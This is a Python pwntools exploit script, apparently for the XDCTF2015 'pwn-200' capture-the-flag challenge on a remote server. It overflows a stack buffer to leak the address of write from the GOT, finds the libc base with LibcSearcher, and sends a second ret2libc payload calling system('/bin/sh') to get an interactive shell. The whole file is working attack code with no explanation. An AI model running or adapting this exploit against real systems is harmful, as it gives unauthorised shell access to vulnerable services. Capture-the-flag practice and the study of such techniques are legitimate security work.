from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

r = remote('111.198.29.45', 35998)
#r = process('./pwn-200')
elf = ELF('./pwn-200')

write_plt = elf.plt['write']
write_got = elf.got['write']
main = 0x080484BE

payload = 'A'*(0x6c+4) + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)

r.recvuntil("Welcome to XDCTF2015~!\n")
r.sendline(payload)
write_addr = u32(r.recv(4))

obj = LibcSearcher("write", write_addr)
base = write_addr - obj.dump("write")
system = obj.dump("system") + base
binsh = obj.dump("str_bin_sh") + base

payload = 'A'*(0x6c+4) + p32(system) + p32(0) + p32(binsh)

r.recvuntil("Welcome to XDCTF2015~!\n")
r.sendline(payload)






r.interactive()



